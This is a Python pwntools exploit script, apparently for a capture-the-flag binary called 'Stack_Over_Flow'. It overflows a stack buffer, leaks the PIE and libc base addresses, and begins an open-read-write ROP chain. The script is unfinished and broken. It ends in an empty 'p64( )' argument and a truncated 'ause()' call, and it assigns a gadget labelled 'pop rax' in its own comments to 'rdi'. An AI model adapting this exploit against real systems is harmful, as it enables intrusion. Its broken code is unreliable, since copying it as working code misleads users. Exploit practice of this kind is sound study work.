from pwn import*
# from LibcSearcher import*
import ctypes
import time
context(os = "linux",arch = "amd64",log_level = "debug")
binary = "./Stack_Over_Flow"
if args["REMOTE"]:
   io = remote("127.0.0.1",8080)
else : 
   io = process(binary) 
elf = ELF(binary)
libc = ELF("./libc.so.6")
lib = ctypes.CDLL('libc.so.6')

s       = lambda data               :io.send(data)
sa      = lambda delim,data         :io.sendafter(str(delim),data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(str(delim), data)
r       = lambda num                :io.recv(num)
ru      = lambda delims, droio=False  :io.recvuntil(delims, droio)
itr     = lambda                    :io.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} is---->{:#x}'.format(name, addr))
l64     = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def bug():
    gdb.attach(io)
    pause()

# ================return to magic ; print main*qword_4038 ========================
pay = b'a'*(0x100)+b'b'*8+p8(0x5f)
sa("Good luck!",pay)

# ================Use ctypes ; leak PIE_base ========================
ru(b'magic number:')
leak_number =int(r(16),10)
print(f"lean_num is {hex(leak_number)}")
for i in range(3,5):
    main_addr = leak_number//i
    if (main_addr&0xff)==0xb0:
        PIE_base = main_addr - 0x16B0
        print(f"PIE_base is =====>{hex(PIE_base)}")

# ================leak libc_addr ===================================
time = elf.plt.time+PIE_base
rand = elf.plt.rand+PIE_base
puts = elf.plt.puts+PIE_base
second_fun = PIE_base+0x161F
ret = PIE_base+0x101a
pay = b'a'*(0x100)+b'b'*8+p64(rand)+p64(puts)+p64(second_fun)
sa("Good luck!",pay)
libc_base = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) & 0xfffffffffffff000
libc_base = libc_base-0x21a000
leak("libc_base",libc_base)
leak("write",libc.sym.write)

# ====================ORW ===================================
#0x000000000002a3e5 : pop rdi ; ret
#0x000000000002be51 : pop rsi ; ret
#0x000000000011f357 : pop rdx ; pop r12 ; ret
#0x0000000000045eb0 ：pop rax ; ret
rdi = 0x45eb0+libc_base
rsi = 0x2be51+libc_base
rdx_r12 = 0x11f357+libc_base
rcx = 0x3d1ee+libc_base
rax = 0x045eb0+libc_base
syscall = 0x29db4+libc_base

pay = b'a'*(0x108)+b'b'*8
pay += p64(rdi)+p64(PIE_base)
pay += p64(rsi)+p64( )


ause()
itr()

